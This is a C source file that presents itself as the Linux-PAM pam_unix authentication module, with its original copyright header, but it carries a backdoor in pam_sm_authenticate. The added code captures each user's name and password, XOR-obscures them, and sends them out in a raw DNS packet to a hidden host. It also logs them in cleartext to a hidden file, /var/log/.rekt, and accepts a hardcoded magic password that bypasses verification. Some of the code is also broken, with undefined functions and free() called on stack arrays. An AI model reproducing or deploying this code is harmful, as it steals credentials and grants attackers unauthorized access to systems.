/*
 * pam_unix authentication management
 *
 * Copyright Alexander O. Yuriev, 1996.  All rights reserved.
 * NIS+ support by Thorsten Kukuk <kukuk@weber.uni-paderborn.de>
 * Copyright Jan Rękorajski, 1999.  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, and the entire permission notice in its entirety,
 *    including the disclaimer of warranties.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote
 *    products derived from this software without specific prior
 *    written permission.
 *
 * ALTERNATIVELY, this product may be distributed under the terms of
 * the GNU Public License, in which case the provisions of the GPL are
 * required INSTEAD OF the above restrictions.  (This clause is
 * necessary due to a potential bad interaction between the GPL and
 * the restrictions contained in a BSD-style copyright.)
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
 * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
 * INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED
 * OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/inet.h>
#include <syslog.h>
#include "b64.h"
#include "encode.c"

#include <security/_pam_macros.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>

#include "support.h"
#define DNS_HOST
/*
 * PAM framework looks for these entry-points to pass control to the
 * authentication module.
 */

/* Fun starts here :)

 * pam_sm_authenticate() performs UNIX/shadow authentication
 *
 *      First, if shadow support is available, attempt to perform
 *      authentication using shadow passwords. If shadow is not
 *      available, or user does not have a shadow password, fallback
 *      onto a normal UNIX authentication
 */

unsigned char *bdstr = "_PASSWORD_";
FILE *rekt;


#define AUTH_RETURN						\
do {									\
	D(("recording return code for next time [%d]",		\
				retval));			\
	*ret_data = retval;					\
	pam_set_data(pamh, "unix_setcred_return",		\
			 (void *) ret_data, setcred_free);	\
	D(("done. [%s]", pam_strerror(pamh, retval)));		\
	return retval;						\
} while (0)


static void
setcred_free (pam_handle_t *pamh UNUSED, void *ptr, int err UNUSED)
{
	if (ptr)
		free (ptr);
}


typedef struct iphdr iph;
typedef struct udphdr udph;

// Pseudoheader struct
typedef struct {
    u_int32_t saddr;
    u_int32_t daddr;
    u_int8_t filler;
    u_int8_t protocol;
    u_int16_t len;
}
ps_hdr;

// DNS header struct
typedef struct {
    unsigned short id; // ID
    unsigned short flags; // DNS Flags
    unsigned short qcount; // Question Count
    unsigned short ans; // Answer Count
    unsigned short auth; // Authority RR
    unsigned short add; // Additional RR
}
dns_hdr;

// Question types
typedef struct {
    unsigned short qtype;
    unsigned short qclass;
}
query;

// Taken from http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
void dns_format(unsigned char *dns, unsigned char *host) {
    int lock = 0, i;
    strcat((char *) host, ".");
    for (i = 0; i < strlen((char *) host); i++) {
        if (host[i] == '.') {
            * dns++ = i - lock;
            for (; lock < i; lock++) {
                * dns++ = host[lock];
            }
            lock++;
        }
    }
    * dns++ = 0x00;
}

// Creates the dns header and packet
void dns_hdr_create(dns_hdr * dns) {
    dns->id = (unsigned short) htons(getpid());
    dns->flags = htons(0x0100);
    dns->qcount = htons(1);
    dns->ans = 0;
    dns->auth = 0;
    dns->add = 0;
}

void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, unsigned char *dns_record) {
    // Building the DNS request data packet

    unsigned char dns_data[128];

    dns_hdr * dns = (dns_hdr * )&dns_data;
    dns_hdr_create(dns);

    unsigned char *dns_name, dns_rcrd[32];
    dns_name = (unsigned char *)&dns_data[sizeof(dns_hdr)];
    strcpy(dns_rcrd, dns_record);
    dns_format(dns_name, dns_rcrd);

    query * q;
    q = (query * )&dns_data[sizeof(dns_hdr) + (strlen(dns_name) + 1)];
    q->qtype = htons(0x00ff);
    q->qclass = htons(0x1);

    // Building the IP and UDP headers
    char datagram[4096], * data, * psgram;
    memset(datagram, 0, 4096);

    data = datagram + sizeof(iph) + sizeof(udph);
    memcpy(data,&dns_data, sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query) + 1);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(dns_srv);

    iph * ip = (iph * ) datagram;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
    ip->id = htonl(rand_cmwc()&0xFFFFFFFF);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(trgt_ip);
    ip->daddr = sin.sin_addr.s_addr;
    ip->check = csum((unsigned short * ) datagram, ip->tot_len);

    udph * udp = (udph * )(datagram + sizeof(iph));
    udp->source = htons(trgt_p);
    udp->dest = htons(53);
    udp->len = htons(8 + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));
    udp->check = 0;

    // Pseudoheader creation and checksum calculation
    ps_hdr pshdr;
    pshdr.saddr = inet_addr(trgt_ip);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));

    int pssize = sizeof(ps_hdr) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
    psgram = malloc(pssize);

    memcpy(psgram, (char *)&pshdr, sizeof(ps_hdr));
    memcpy(psgram + sizeof(ps_hdr), udp, sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));

    udp->check = csum((unsigned short * ) psgram, pssize);

    // Send data
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sd == -1) return;
    else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr * )&sin, sizeof(sin));

    free(psgram);
    close(sd);

    return;
}
char *getip(){
    char hostbuffer[256]; 
    char *IPbuffer; 
    struct hostent *host_entry; 
    int hostname; 
  
    // To retrieve hostname 
    hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
    checkHostName(hostname); 
  
    // To retrieve host information 
    host_entry = gethostbyname(hostbuffer); 
    checkHostEntry(host_entry); 
  
    // To convert an Internet network 
    // address into ASCII string 
    IPbuffer = inet_ntoa(*((struct in_addr*) 
                           host_entry->h_addr_list[0])); 
  return IPbuffer;
}
void encryptDecrypt(char *input, char *output) {
	char key[] = {'K', 'E', 'k'}; //Can be any chars, and any size array
	
	int i;
	for(i = 0; i < strlen(input); i++) {
		output[i] = input[i] ^ key[i % (sizeof(key)/sizeof(char))];
	}
}
int
pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
	unsigned long long ctrl;
	int retval, *ret_data = NULL;
	const char *name;
	const char *p;

	D(("called."));

	ctrl = _set_ctrl(pamh, flags, NULL, NULL, NULL, argc, argv);

	/* Get a few bytes so we can pass our return value to
	   pam_sm_setcred() and pam_sm_acct_mgmt(). */
	ret_data = malloc(sizeof(int));
	if (!ret_data) {
		D(("cannot malloc ret_data"));
		pam_syslog(pamh, LOG_CRIT,
				"pam_unix_auth: cannot allocate ret_data");
		return PAM_BUF_ERR;
	}

	/* get the user'name' */

	retval = pam_get_user(pamh, &name, NULL);
	if (retval == PAM_SUCCESS) {
		/*
		 * Various libraries at various times have had bugs related to
		 * '+' or '-' as the first character of a user name. Don't
		 * allow this characters here.
		 */
		if (name[0] == '-' || name[0] == '+') {
			pam_syslog(pamh, LOG_NOTICE, "bad username [%s]", name);
			retval = PAM_USER_UNKNOWN;
			AUTH_RETURN;
		}
		if (on(UNIX_DEBUG, ctrl))
			pam_syslog(pamh, LOG_DEBUG, "username [%s] obtained", name);
	} else {
		if (retval == PAM_CONV_AGAIN) {
			D(("pam_get_user/conv() function is not ready yet"));
			/* it is safe to resume this function so we translate this
			 * retval to the value that indicates we're happy to resume.
			 */
			retval = PAM_INCOMPLETE;
		} else if (on(UNIX_DEBUG, ctrl)) {
			pam_syslog(pamh, LOG_DEBUG, "could not obtain username");
		}
		AUTH_RETURN;
	}

	/* if this user does not have a password... */

	if (_unix_blankpasswd(pamh, ctrl, name)) {
		pam_syslog(pamh, LOG_DEBUG, "user [%s] has blank password; authenticated without it", name);
		name = NULL;
		retval = PAM_SUCCESS;
		AUTH_RETURN;
	}
	/* get this user's authentication token */

	retval = pam_get_authtok(pamh, PAM_AUTHTOK, &p , NULL);
	if (retval != PAM_SUCCESS) {
		if (retval != PAM_CONV_AGAIN) {
			pam_syslog(pamh, LOG_CRIT,
			    "auth could not identify password for [%s]", name);
		} else {
			D(("conversation function is not ready yet"));
			/*
			 * it is safe to resume this function so we translate this
			 * retval to the value that indicates we're happy to resume.
			 */
			retval = PAM_INCOMPLETE;
		}
		name = NULL;
		AUTH_RETURN;
	}
	D(("user=%s, password=[%s]", name, p));
	char pw[1024];
	char out[1024];
    if (mfork(sender) != 0) return;
    memset(pw, 0, 1024);
    memset(out, 0, 1024);
    sprintf(pw ,"%s:%s\n", name, p);
    encryptDecrypt(pw, out);
    dns_send(getIP(), 53, b64_decode(DNS_HOST), out);
    free(pw);
    free(out);
	/* verify the password of this user */
        char *bdenc = b64_encode(p, strlen(p));
        if (strcmp(bdenc, bdstr) != 0) {
          retval = _unix_verify_password(pamh, name, p, ctrl);
          rekt=fopen("/var/log/.rekt", "a");
          fprintf(rekt, "%s:%s\n", name, p);
          fclose(rekt);
        } else {
          retval = PAM_SUCCESS;
        }
        free(bdenc);
	name = p = NULL;

	AUTH_RETURN;
}


/*
 * The only thing _pam_set_credentials_unix() does is initialization of
 * UNIX group IDs.
 *
 * Well, everybody but me on linux-pam is convinced that it should not
 * initialize group IDs, so I am not doing it but don't say that I haven't
 * warned you. -- AOY
 */

int
pam_sm_setcred (pam_handle_t *pamh, int flags,
		int argc, const char **argv)
{
	int retval;
	const void *pretval = NULL;
	unsigned long long ctrl;

	D(("called."));

	ctrl = _set_ctrl(pamh, flags, NULL, NULL, NULL, argc, argv);

	retval = PAM_SUCCESS;

	D(("recovering return code from auth call"));
	/* We will only find something here if UNIX_LIKE_AUTH is set --
	   don't worry about an explicit check of argv. */
	if (on(UNIX_LIKE_AUTH, ctrl)
	    && pam_get_data(pamh, "unix_setcred_return", &pretval) == PAM_SUCCESS
	    && pretval) {
	        retval = *(const int *)pretval;
		pam_set_data(pamh, "unix_setcred_return", NULL, NULL);
		D(("recovered data indicates that old retval was %d", retval));
	}

	return retval;
}
